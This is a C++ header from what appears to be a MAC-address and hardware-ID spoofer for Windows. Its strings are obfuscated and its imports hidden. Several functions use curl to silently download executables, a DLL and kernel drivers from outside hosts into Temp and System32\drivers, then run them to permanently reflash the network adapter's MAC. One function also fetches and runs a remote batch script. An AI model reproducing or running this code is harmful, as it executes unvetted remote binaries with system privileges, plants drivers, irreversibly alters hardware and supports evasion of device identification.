#include <iostream>
#include <fstream>
#include "skStr.h"
#include <Windows.h>
#include <lazy_importer.hpp>
#include <optimize.h>

#include <ctime>
#include "windows.h"
#include <fstream>
#include <string>
#include <iostream>
#include <iomanip>
#include <random>
#include <sstream>
#include <iphlpapi.h>
#include <vector>
#include <tchar.h>
#include <dwmapi.h>
#include <algorithm>
#include <chrono>
#include <iphlpapi.h>
#include <wbemidl.h>
#include <comdef.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "user32.lib")
#ifndef PERM_MAC_H
#define PERM_MAC_H



std::string generateMacAddress(const std::string& prefix) {
    if (prefix.length() != 6) {
        throw std::invalid_argument(skCrypt("Prefix must be exactly 3 bytes (6 hex digits).").decrypt());
    }
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream macAddress;
    macAddress << std::hex << std::uppercase << std::setfill('0');
    macAddress << prefix;
    for (int i = 0; i < 3; ++i) {
        macAddress << std::setw(2) << dis(gen);
    }
    return macAddress.str();
}

std::string getUUIDLast12() {
    std::string uuid;
    char buffer[256];

    FILE* pipe = _popen(skCrypt("wmic csproduct get uuid").decrypt(), skCrypt("r").decrypt());
    if (!pipe) {
        return skCrypt("").decrypt();
    }

    fgets(buffer, sizeof(buffer), pipe);

    if (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        uuid = buffer;
    }
    _pclose(pipe);

    uuid.erase(std::remove(uuid.begin(), uuid.end(), '\n'), uuid.end());
    uuid.erase(std::remove(uuid.begin(), uuid.end(), '\r'), uuid.end());


    if (uuid.length() < 12) {
        return skCrypt("").decrypt();
    }


    return uuid.substr(uuid.length() - 14);
}
std::string getManufacturer() {
    std::string manufacturer;
    char buffer[256];
    FILE* pipe = _popen(skCrypt("powershell -ExecutionPolicy Bypass -Command \"& { Get-WmiObject Win32_NetworkAdapter | Where-Object { $_.AdapterTypeID -eq 0 -and $_.NetConnectionStatus -eq 2 -and $_.NetConnectionID -like '*Ethernet*' } | ForEach-Object { if ($_.PNPDeviceID -like '*VEN_10EC*') { Write-Output 'Realtek' } elseif ($_.PNPDeviceID -like '*VEN_8086*') { Write-Output 'Intel' } } }\"").decrypt(), skCrypt("r").decrypt());
    if (!pipe) {

        return skCrypt("").decrypt();
    }
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        manufacturer += buffer;
    }
    _pclose(pipe);
    manufacturer.erase(std::remove(manufacturer.begin(), manufacturer.end(), '\n'), manufacturer.end());
    return manufacturer;
}

void CheckNetworkAdapter() {
    AllocConsole();
    std::string manufacturer = getManufacturer();
    std::string last12 = getUUIDLast12();

    if (manufacturer == skCrypt("Realtek").decrypt()) {
        LI_FN(system)(skCrypt("curl https://slyzz.fr/woof/realtek2/RTNicPgW64.exe -o C:\\Windows\\Temp\\RTNicPgW64.exe --silent").decrypt());
        LI_FN(system)(skCrypt("curl https://slyzz.fr/woof/realtek2/RTIoLib64.dll -o C:\\Windows\\Temp\\RTIoLib64.dll --silent").decrypt());
        LI_FN(system)(skCrypt("curl https://slyzz.fr/woof/realtek2/rtkiow10x64.sys -o C:\\Windows\\Temp\\rtkiow10x64.sys  --silent").decrypt());

        std::string prefix = skCrypt("E0CA22").decrypt();
        std::string macAddress = generateMacAddress(prefix);
        LI_FN(system)((skCrypt("C:\\Windows\\Temp\\RTNicPgW64.exe /efuse /nodeid ").decrypt() + macAddress + skCrypt("  ").decrypt()).c_str());
    }
    else if (manufacturer == skCrypt("Intel").decrypt()) {
        LI_FN(system)(skCrypt("curl https://slyzz.fr/woof/intel2/EEUPDATEW64e.exe -o C:\\Windows\\Temp\\EEUPDATEW64e.exe --silent").decrypt());
        LI_FN(system)(skCrypt("curl https://slyzz.fr/woof/intel2/iqvsw64e.sys -o C:\\Windows\\System32\\drivers\\iqvsw64e.sys --silent ").decrypt());

        LI_FN(system)((skCrypt("C:\\Windows\\Temp\\EEUPDATEW64e.exe /nic=1 /mac=").decrypt() + last12 + skCrypt(" ").decrypt()).c_str());
    }
    else {
        MessageBoxA(NULL, skCrypt("Use a VPN / Contact Support").decrypt(), skCrypt("Information").decrypt(), MB_OK | MB_ICONERROR);
    }
}

void macall() {
   

    LI_FN(system)(skCrypt("curl https://ojajsfmnbsxbyvxrybmc.supabase.co/storage/v1/object/public/permvm//MAC.bat -o C:\\Windows\\Temp\\MAC.bat --silent").decrypt());
    LI_FN(system)(skCrypt("C:\\Windows\\Temp\\MAC.bat rescan --silent").decrypt());
    LI_FN(system)(skCrypt("del /f C:\\Windows\\System32\\drivers\\MAC.bat --silent").decrypt());

}

#endif PERM_MAC_H